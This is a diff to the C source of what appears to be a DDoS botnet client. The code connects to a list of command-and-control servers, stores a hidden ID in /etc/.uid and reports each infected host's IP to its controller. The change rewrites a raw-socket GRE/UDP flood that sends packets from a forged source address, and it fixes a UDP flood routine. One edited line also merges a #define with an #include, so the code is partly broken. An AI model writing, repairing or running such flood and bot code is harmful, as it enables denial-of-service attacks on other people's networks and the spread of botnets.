@@ -12,39 +12,38 @@
 #define PROTO_GRE 47
 #define GRE_PROTO_IP 0x0800
 #define PROTO_UDPLITE 136
-
-
- 
 #define UDP_HDRLEN 8
 #define IP_MAXPACKET 65535
 #define UID_PATH "/etc/.uid"
 #define XOR_KEY "demonkey"
 #define IP4_HDRLEN 20
-#define ICMP_HDRLEN 8
-#include <stdlib.h>
+#define ICMP_HDRLEN 8#include <stdlib.h>
 #include <stdarg.h>
 #include <stdio.h>
-#include <sys/socket.h>   // for struct iphdr
-#include <arpa/inet.h>     // for inet_addr, htons
+#include <string.h>
+#include <unistd.h>
+#include <time.h>
+#include <errno.h>
+#include <fcntl.h>
+#include <signal.h>
+#include <pthread.h>
 
 #include <sys/types.h>
-#include <netinet/in.h>
-#include <arpa/inet.h>
-#include <netdb.h>
-#include <signal.h>
-#include <strings.h>
-#include <string.h>
+#include <sys/socket.h>
 #include <sys/utsname.h>
-#include <unistd.h>
-#include <fcntl.h>
-#include <errno.h>
-#include <netinet/ip.h>
-
-#include <netinet/tcp.h>
 #include <sys/wait.h>
 #include <sys/ioctl.h>
+
+#include <netinet/in.h>
+#include <netinet/ip.h>
+#include <netinet/udp.h>
+#include <netinet/tcp.h>
 #include <net/if.h>
-#include <pthread.h>
+
+#include <arpa/inet.h>
+#include <netdb.h>
+#include <strings.h>
+
 
 unsigned char *commServer[] =
 {
@@ -68,10 +67,7 @@ unsigned char macAddress[6] = {0};
 
 #define PHI 0x9e3779b9
 static uint32_t Q[4096], c = 362436;
-struct grehdr {
-    uint16_t flags;
-    uint16_t protocol;
-};
+
 void init_rand(uint32_t x)
 {
         int i;
@@ -691,92 +687,72 @@ int sclose(int fd)
 
 
 struct grehdr {
-    uint16_t flags;
-    uint16_t protocol;
+    uint16_t flags_and_version; // Usually 0x2000 or 0x0000
+    uint16_t protocol_type;     // Set to 0x0800 for IPv4
 };
+
 
 unsigned short csum(unsigned short *buf, int nwords) {
     unsigned long sum = 0;
-    for (; nwords > 0; nwords--) sum += *buf++;
+    for (; nwords > 0; nwords--)
+        sum += *buf++;
     sum = (sum >> 16) + (sum & 0xffff);
     sum += (sum >> 16);
-    return (unsigned short)(~sum);
+    return ~sum;
 }
-
 void send_gre_udp_packets(const char *dst_ip, int port, int packetsize, int secs) {
     int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
     if (sock < 0) {
-        perror("raw socket");
+        perror("socket");
         return;
     }
 
-    int one = 1;
-    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
+    char packet[4096];
+    struct iphdr *iph = (struct iphdr *) packet;
+    struct grehdr *gre = (struct grehdr *) (packet + sizeof(struct iphdr));
+    struct udphdr *udph = (struct udphdr *) (packet + sizeof(struct iphdr) + sizeof(struct grehdr));
+    char *data = (char *)(packet + sizeof(struct iphdr) + sizeof(struct grehdr) + sizeof(struct udphdr));
 
-    char packet[1500];
-    struct iphdr *ip_outer = (struct iphdr *)packet;
-    struct grehdr *gre = (struct grehdr *)(packet + sizeof(struct iphdr));
-    struct iphdr *ip_inner = (struct iphdr *)(packet + sizeof(struct iphdr) + sizeof(struct grehdr));
-    struct udphdr *udp = (struct udphdr *)(packet + sizeof(struct iphdr) + sizeof(struct grehdr) + sizeof(struct iphdr));
-    char *data = (char *)(udp + 1);
+    memset(packet, 0, sizeof(packet));
+    memset(data, 'A', packetsize);
+
+    // Fill IP header
+    iph->ihl = 5;
+    iph->version = 4;
+    iph->tos = 0;
+    iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct grehdr) + sizeof(struct udphdr) + packetsize);
+    iph->id = htons(54321);
+    iph->frag_off = 0;
+    iph->ttl = 64;
+    iph->protocol = IPPROTO_GRE;
+    iph->saddr = inet_addr("192.168.1.100"); // Change as needed
+    iph->daddr = inet_addr(dst_ip);
+    iph->check = csum((unsigned short *) packet, sizeof(struct iphdr) / 2);
+
+    // Fill GRE header
+    gre->flags_and_version = htons(0x2000);
+    gre->protocol_type = htons(0x0800); // IPv4
+
+
+    // Fill UDP header
+    udph->source = htons(1234);
+    udph->dest = htons(port);
+    udph->len = htons(sizeof(struct udphdr) + packetsize);
+    udph->check = 0;  // optional
 
     struct sockaddr_in sin;
     sin.sin_family = AF_INET;
-    inet_pton(AF_INET, dst_ip, &sin.sin_addr);
+    sin.sin_port = htons(port);
+    sin.sin_addr.s_addr = iph->daddr;
 
-    // Spoofed source
-    char src_ip[] = "192.0.2.1";  // use a test IP or real one
-
-    time_t end = time(NULL) + secs;
-    while (time(NULL) < end) {
-        memset(packet, 0, sizeof(packet));
-        memset(data, 'B', packetsize);
-
-        // Outer IP
-        ip_outer->ihl = 5;
-        ip_outer->version = 4;
-        ip_outer->tos = 0;
-        ip_outer->tot_len = htons(sizeof(struct iphdr) + sizeof(struct grehdr) +
-                                  sizeof(struct iphdr) + sizeof(struct udphdr) + packetsize);
-        ip_outer->id = htons(rand() % 65535);
-        ip_outer->frag_off = 0;
-        ip_outer->ttl = 64;
-        ip_outer->protocol = 47; // GRE
-        ip_outer->saddr = inet_addr(src_ip);
-        ip_outer->daddr = sin.sin_addr.s_addr;
-        ip_outer->check = csum((unsigned short *)ip_outer, sizeof(struct iphdr) / 2);
-
-        // GRE
-        gre->flags = 0;
-        gre->protocol = htons(0x0800); // IP
-
-        // Inner IP
-        ip_inner->ihl = 5;
-        ip_inner->version = 4;
-        ip_inner->tos = 0;
-        ip_inner->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + packetsize);
-        ip_inner->id = htons(rand() % 65535);
-        ip_inner->frag_off = 0;
-        ip_inner->ttl = 64;
-        ip_inner->protocol = IPPROTO_UDP;
-        ip_inner->saddr = inet_addr(src_ip);
-        ip_inner->daddr = sin.sin_addr.s_addr;
-        ip_inner->check = csum((unsigned short *)ip_inner, sizeof(struct iphdr) / 2);
-
-        // UDP
-        udp->source = htons(rand() % 65535);
-        udp->dest = htons(port);
-        udp->len = htons(sizeof(struct udphdr) + packetsize);
-        udp->check = 0; // checksum optional for UDP
-
-        sendto(sock, packet,
-               sizeof(struct iphdr) + sizeof(struct grehdr) +
-               sizeof(struct iphdr) + sizeof(struct udphdr) + packetsize,
-               0, (struct sockaddr *)&sin, sizeof(sin));
+    time_t start = time(NULL);
+    while (time(NULL) - start < secs) {
+        sendto(sock, packet, ntohs(iph->tot_len), 0, (struct sockaddr *)&sin, sizeof(sin));
     }
 
     close(sock);
 }
+
 
 void makeSystemUID(unsigned char *uid, int size) {
     unsigned char bogomips[16];
@@ -802,7 +778,7 @@ void send_packets(unsigned char *ip, int port,  int secs, int packetsize) {
     memset(packet, 'A', packetsize);  // Fill with dummy data
 
     time_t start = time(NULL);
-    while (time(NULL) - start < duration_secs) {
+    while (time(NULL) - start < secs) {
         sendto(sock, packet, packetsize, 0, (struct sockaddr *)&target, sizeof(target));
     }
 
@@ -1005,7 +981,7 @@ int main(int argc, unsigned char *argv[])
         getOurIP();
         unsigned char uid[64];
               makeSystemUID(uid, sizeof(uid));
-              sockprintf(mainCommSock, "\x1b[33mUID %s\x1b[0m", uid);
+              sockprintf(mainCommSock, "UID %s", uid);
         if (pid1 = fork()) {
                         waitpid(pid1, &status, 0);
                         exit(0);
@@ -1027,7 +1003,7 @@ int main(int argc, unsigned char *argv[])
         {
                 if(initConnection()) { sleep(5); continue; }
 
-		sockprintf(mainCommSock, "\x1b[36m[ CONNECTED ] \x1b[34m IP: %s \x1b[35m[ BUILD: \x1b[34m%s\x1b[0m", inet_ntoa(ourIP), getBuild());
+		sockprintf(mainCommSock, "[ CONNECTED ] IP: %s [ BUILD: %s", inet_ntoa(ourIP), getBuild());
               
 
                 char commBuf[4096];
@@ -1130,4 +1106,3 @@ int main(int argc, unsigned char *argv[])
 
         return 0;
 }
-
